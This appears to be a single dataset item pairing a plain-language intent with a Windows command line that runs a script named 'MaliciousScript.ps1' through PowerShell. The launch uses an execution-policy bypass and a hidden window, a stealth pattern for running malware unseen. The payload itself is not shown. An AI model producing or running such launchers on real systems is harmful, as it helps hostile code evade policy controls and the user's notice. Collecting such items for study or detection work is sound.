# Natural language intent:
# Executes a malicious PowerShell script located at "C:\MaliciousScript.ps1" with specific execution policies and settings.

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -WindowStyle Hidden -NoProfile -File "C:\MaliciousScript.ps1"
